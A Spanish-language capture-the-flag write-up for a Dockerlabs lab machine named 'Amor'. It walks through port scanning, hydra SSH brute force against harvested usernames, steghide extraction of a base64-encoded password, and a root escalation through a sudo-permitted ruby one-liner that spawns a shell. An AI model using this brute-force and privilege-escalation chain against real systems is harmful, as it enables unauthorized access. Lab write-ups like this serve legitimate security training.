
# Writeup Template: Maquina `[ Amor ]`

- Tags: #Amor
- Dificultad: `[ Facil ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Amor](https://mega.nz/file/hG8ijIxA#ru335im55yCTn2_FgLHVNh_Y5QU2SES8apugbPJVkd0)

## Configuración del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x amor.zip
sudo bash auto_deploy.sh amor.tar
```

---

## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sC -sV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
1. `[ 22 ]/[ TCP ]`: [ SSH ] ([ 9.6 ])
2. `[ 80 ]/[ TCP ]`: [ Apache ] ([ 2.4.58 ]) **ubuntuNoble**
---

## Enumeracion de [Servicio Web Principal]

Revisando la web principal detectamos nombres de dos posibles usuarios: A los cuales realizaremos fuerza bruta por **ssh**
```bash
http://172.17.0.2/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2 # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
- No reporta nada relevante

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,sh,txt,html,js
```

- **Hallazgos**:
No reporta nada

Aplicaremos fuerza bruta con estos usuarios que logramos obtener desde la web:
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f ssh://172.17.0.2
```
### Credenciales Encontradas
- Usuario: `[ juan ]`
- Contraseña: `[Contraseña]`

- Usuario: `[ carlota ]`
- Contraseña: `[ babygirl ]` # Tenemos la contrasena de este usuario.
---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora que tenemos credenciales de acceso por **ssh** usaremos para conectarnos.
### Intrusion

```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh carlota@172.17.0.2
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
Tenemos esta ruta que contempla una imagen del usuario **carlota**
```bash
# Comandos clave ejecutados
/home/carlota/Desktop/fotos/vacaciones
```

**Hallazgos Clave:**
- Binario con privilegios: `[ imagen.jpg ]`
- Credenciales de usuario: `[ carlota ]:[ babygirl ]`
### Explotacion de Privilegios

###### Usuario `[ carlota ]`:

Tenemos una imagen la cual descargaremos en nuestro equipo de atacante con **python3** montamos un servidor en donde este la imagen:
```bash
which python3
/usr/bin/python3
```

Montamos el servidor:
```bash
python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Ahora desde nuesta maquina atacante descargaremos el recurso:
```bash
 wget http://172.17.0.2:8080/imagen.jpg
```

###### Aplicamos Cracking de Imagenes:
```bash
file imagen.jpg # no reporta nada
strings imagen.jpg  # No obtuvimos nada relevante
binwalk imagen.jpg # No reporto nada relevante
```

Este comando si nos reporta:
```bash
steghide info imagen.jpg

archivo adjunto "secret.txt":
```

Extraemos el archivo **secreto**:
```bash
steghide extract -sf imagen.jpg
```

Ahora tenemos este archivo: **( secret.txt )**
```bash
cat secret.txt
```

Tenemos una posible contrasena de un usuario del sistema en **base64**:
```bash
ZXNsYWNhc2FkZXBpbnlwb24=
```

Desencriptamos la cadena en **base64** para ver su contenido real
```bash
echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d
```

Resultado:
```bash
eslacasadepinypon
```

Revisando el archivo: **( /etc/passwd )** tenemos dos usuario mas del sistema: que probaremos esa cadena:
```bash
oscar:x:1002:1002::/home/oscar:/bin/sh
root:x:0:0:root:/root:/bin/bash
```

```bash
# Comando para escalar al usuario: ( oscar )
su oscar # ( eslacasadepinypon )
```

###### Usuario `[ oscar ]`:
Ahora como estu usuario tendremos que migrar al usuario privilegiado **root**

Listamos permisos de usuario:
```bash
sudo -l

User oscar may run the following commands on 6d894eafbf58:
    (ALL) NOPASSWD: /usr/bin/ruby # Tenemos un via potencial de migrar a root
```

**Hallazgos Clave:**
- Binario con privilegios: `[ /usr/bin/ruby ]`
- Credenciales de usuario: `[ oscar ]:[  ]`

```bash
# Comando para escalar al usuario: ( root )
sudo -u root /usr/bin/ruby -e 'exec "/bin/bash"'
```
---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@6d894eafbf58:~/Desktop# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a extraer informacion o archivos ocultos de una imagen
2. Aprendimos a detectar usuarios desde la web principal
3. Aprendimos a explotar el binario de **ruby** para escalar a **root**

## Recomendaciones de Seguridad
- No ocultar archivos secretos en imagenes
- No guardar contrasenas en **base64** es mala practica